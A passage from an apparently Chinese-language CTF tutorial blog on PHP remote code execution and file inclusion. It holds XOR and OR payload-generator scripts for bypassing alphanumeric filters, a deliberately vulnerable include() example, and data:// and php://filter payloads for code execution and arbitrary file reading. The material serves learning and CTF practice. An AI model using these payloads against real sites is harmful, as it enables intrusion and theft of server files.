</span></span><span class="line"><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$preg</span> <span class="o">=</span> <span class="s1">&#39;/[a-z0-9]/i&#39;</span><span class="p">;</span> <span class="c1">//根据题目给的正则表达式修改即可
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_i</span><span class="p">))</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_j</span><span class="p">))){</span>
</span></span><span class="line"><span class="cl">					<span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">^</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">32</span><span class="o">&amp;</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nv">$contents</span><span class="o">=</span><span class="nv">$contents</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$contents</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个脚本可以找出两两字符异或后的所有可见字符的结果，然后写入一个文件中,输入你想要构造的函数名和要执行的命令即可生成最终的 Payload，我们接下来试一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># author yu22x</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">   <span class="n">s1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="n">s2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arg</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">       <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;xor_rce.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">       <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">           <span class="n">t</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">               <span class="c1">#print(i)</span>
</span></span><span class="line"><span class="cl">               <span class="n">s1</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">               <span class="n">s2</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="cl">       <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">   <span class="n">output</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">^</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">param</span><span class="o">=</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] your function：&#34;</span><span class="p">)</span> <span class="p">)</span><span class="o">+</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] your command：&#34;</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;;&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="或运算">或运算
</h3><p>在前面异或绕过中我们说了，PHP 中两个字符串异或之后得到的还是一个字符串。那么或运算原理也是一样，使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">contents</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">preg</span> <span class="o">=</span> <span class="s1">&#39;[a-z]|[0-9]&#39;</span><span class="c1">#匹配题目正则</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">preg</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span> <span class="ow">or</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="n">preg</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">),</span><span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">            <span class="n">k</span> <span class="o">=</span> <span class="n">i</span> <span class="o">|</span> <span class="n">j</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="mi">32</span> <span class="o">&lt;=</span> <span class="n">k</span> <span class="o">&lt;=</span> <span class="mi">126</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">a</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">b</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">j</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">contents</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">a</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">b</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;rce_or.txt&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;请输入想要或运算的字符串:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;rce_or.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span><span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload1</span> <span class="o">=</span> <span class="n">payload1</span> <span class="o">+</span> <span class="n">line</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">payload2</span> <span class="o">=</span> <span class="n">payload2</span> <span class="o">+</span> <span class="n">line</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;(&#34;&#39;</span><span class="o">+</span><span class="n">payload1</span><span class="o">+</span><span class="s1">&#39;&#34;|&#34;&#39;</span><span class="o">+</span><span class="n">payload2</span><span class="o">+</span><span class="s1">&#39;&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;payload:&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">2025</span><span class="o">?</span><span class="nx">CTF</span><span class="o">:</span><span class="nx">ezphp</span>
</span></span><span class="line"><span class="cl"><span class="nx">ctfshow41</span>
</span></span><span class="line"><span class="cl"><span class="nx">极客大挑战</span> <span class="mi">2020</span><span class="o">:</span><span class="nx">rceme</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="八eval中无数字字母rce扩展">八.eval中无数字字母RCE(扩展)
</h2><p>未完待续</p>
<h2 id="九长度限制rce">九:长度限制RCE
</h2><p>未完待续</p>
<h1 id="文件包含">文件包含
</h1><p>如果文件包含函数没有经过严格的过滤或者定义，并且参数可以被用户控制，这样就有可能包含非预期的文件。<strong>如果文件中存在恶意代码，无论文件是什么类型恶意代码都会被解析。</strong></p>
<p><strong>PHP文件包含函数有以下四种：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">include
</span></span><span class="line"><span class="cl">inclued_once
</span></span><span class="line"><span class="cl">require
</span></span><span class="line"><span class="cl">require_once
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>require()/require_once()</code>：如果在包含过程中有错，那么直接退出，不执行进一步操作。
<code>include()/include_once()</code>: 如果在包含过程中出错，只会发出警告</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">所以require与include区别：如果指定的文件不存在或包含过程中发生错误，require()/require_once()这两个函数会抛出一个E_COMPILE_ERROR级别的致命错误。这意味着脚本会立即停止执行，不会继续运行后续代码。nclude()/include_once() 函数则相对宽松。当遇到文件不存在或包含错误时，它们只会产生一个E_WARNING级别的警告，而脚本会继续执行后续代码。
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>加上后缀_once的作用：如果文件已经包含过了，那么不会再次包含</strong></p>
<p><code>当利用这四大漏洞函数包含文件的时候，不论什么类型的文件，都会作为PHP脚本解析(比如：上传一个图片马，包含后当作php解析就可以执行木马了)</code></p>
<h2 id="一无限制本地文件包含">一.无限制本地文件包含
</h2><h3 id="利用伪协议打本地文件包含">利用伪协议打本地文件包含
</h3><p>讲了概念，讲一下如何利用include进行文件读取或者rce，前面我们知道include将文件都会作为PHP脚本解析，所以我们可以把参数指向的文件内容嵌入到其中就可以使得代码成功解析，达到一个rce的效果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">什么是伪协议？
</span></span><span class="line"><span class="cl">伪协议（Pseudo Protocol）在这里通常指PHP中封装的一系列协议，如file://、php://、data://等，它们允许以不同的方式访问输入/输出流、文件系统、数据等。这些协议在文件包含函数（如include、require）中可以使用，从而使得文件包含不再局限于本地文件，还可以从内存、标准输入输出、数据流等来源包含数据。
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">简单来说，伪协议就是PHP提供的一些“特殊路径”，它们不是真正的文件路径，但可以用类似文件路径的方式写入，然后PHP会按照协议的规定去解析并获取数据。
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PHP带有很多内置的URL风格的封装协议，可用于 fopen\copy\file_exists\filesize等文件系统函数
</span></span><span class="line"><span class="cl">常见的PHP伪协议如下：
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">file:// 访问本地文件系统
</span></span><span class="line"><span class="cl">http:// 访问http（s）网址
</span></span><span class="line"><span class="cl">ftp:// 访问ftp（s)URL
</span></span><span class="line"><span class="cl">php:// 访问各个输入输出流
</span></span><span class="line"><span class="cl">zlib:// 处理压缩流
</span></span><span class="line"><span class="cl">data:// 读取数据
</span></span><span class="line"><span class="cl">glob:// 找查匹配的文件路径模式
</span></span><span class="line"><span class="cl">phar:// PHP归档
</span></span><span class="line"><span class="cl">ssh2:// Secure Shell 2
</span></span><span class="line"><span class="cl">rar:// RAR处理压缩数据
</span></span><span class="line"><span class="cl">ogg:// 处理音频流
</span></span><span class="line"><span class="cl">expect:// 处理交互式的流
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="link" href="https://www.php.net/manual/zh/wrappers.file.php"  target="_blank" rel="noopener"
    >PHP: file:// - Manual</a></p>
<h3 id="1data伪协议"><strong>1.data伪协议</strong>
</h3><p>使用条件是phpinfo开启如下配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">allow_url_fopen : on
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">allow_url_include :on
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="link" href="https://www.php.net/manual/zh/wrappers.data.php"  target="_blank" rel="noopener"
    >PHP: data:// - Manual</a></p>
<p>例子：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251119213538624.png"
	width="1709"
	height="228"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251119213538624_hu_fa770a2bcfd76be.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251119213538624_hu_386dcb114b6da9e7.png 1024w"
	loading="lazy"
	
		alt="image-20251119213538624"
	
	
		class="gallery-image" 
		data-flex-grow="749"
		data-flex-basis="1798px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data://text/plain,&lt;?php phpinfo();?&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">解释一下
</span></span><span class="line"><span class="cl">data: ：这是数据 URL 的前缀，告诉浏览器或应用程序后续的数据是以数据方式嵌入的，而不是指向外部资源。
</span></span><span class="line"><span class="cl">text/plain：这是 MIME 类型，表示数据的格式。在这个例子中，text/plain 表示数据是普通文本。MIME 类型用于告知接收端如何处理数据。
</span></span><span class="line"><span class="cl">&lt;?php phpinfo();?&gt;：这是实际的数据内容。在这里，这是一个 PHP 代码片段，它调用了 phpinfo() 函数。该函数用于输出有关当前 PHP 环境和配置的详细信息，包括 PHP 版本、加载的扩展、服务器信息、PHP 配置选项等。
</span></span></code></pre></td></tr></table>
</div>
</div><p>此外，也可以用base64编码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="2filter协议文件包含">2.filter协议文件包含
</h3><p>使用条件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">allow_url_include = On
</span></span></code></pre></td></tr></table>
</div>
</div><p>（注意：filter文件包含时要打开这个配置，用filter文件读取则可以不需要）</p>
<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p>
<p>测试一下，1.php里写phpinfo(),然后包含</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/resource=2.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120002443076.png"
	width="1146"
	height="407"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120002443076_hu_b8dcf51ee338a202.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120002443076_hu_315de93eb5f5b887.png 1024w"
	loading="lazy"
	
		alt="image-20251120002443076"
	
	
		class="gallery-image" 
		data-flex-grow="281"
		data-flex-basis="675px"
	
></p>
<p>发现执行1.php中的命令</p>
<p>当我们打</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/read=convert.base64-encode/resource=2.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以发现只对其进行编码，让其不执行。从而<strong>导致任意文件读取</strong></p>
<p><img src="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120002737276.png"
	width="852"
	height="346"
	srcset="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120002737276_hu_4e31dd6550a3dda8.png 480w, /p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20251120002737276_hu_aa2f113021590e86.png 1024w"
	loading="lazy"
	
		alt="image-20251120002737276"
	
	
		class="gallery-image" 
		data-flex-grow="246"
		data-flex-basis="590px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">解释一下上面的命令
</span></span><span class="line"><span class="cl">convert.base64-encode 表示将数据进行 Base64 编码。
</span></span><span class="line"><span class="cl">
